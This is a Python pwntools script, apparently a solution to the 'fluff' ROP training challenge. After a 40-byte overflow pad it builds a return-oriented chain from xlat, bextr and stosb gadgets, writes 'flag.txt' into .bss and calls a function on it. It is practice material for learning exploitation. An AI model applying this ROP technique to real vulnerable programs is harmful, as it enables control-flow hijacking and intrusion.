import pwn
from pwn import *

s = process("./fluff")
elf = context.binary = ELF('fluff')


xlat = 0x0000000000400628
stosb = 0x0000000000400639
bextr = 0x000000000040062a
pop_rdi = 0x00000000004006a3
bss = 0x0000000000601038
func = 0x400510
flag_mem = [0x3c4, 0x239, 0x3d6, 0x3cf, 0x24e, 0x192, 0x246, 0x192]
mem_loc = []
rax = 0xb
for i  in flag_mem:
    i = hex(i + 0x400000)
    mem_loc.append(i)

flag = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
rop = b""
rop = b"A"*40

for i in range(0,8):
    if(i!=0):
       rax = ord(flag[i-1])
    rop += p64(bextr)
    rop += p64(0x4000)
    p = int(mem_loc[i], 16) - rax - 0x3ef2 
    rop += p64(p)
    rop += p64(xlat)
    rop += p64(pop_rdi)
    rop += p64(bss+i)
    rop += p64(stosb)

rop += p64(pop_rdi)
rop += p64(bss)
rop += p64(func)

s.sendline(rop)
s.interactive()
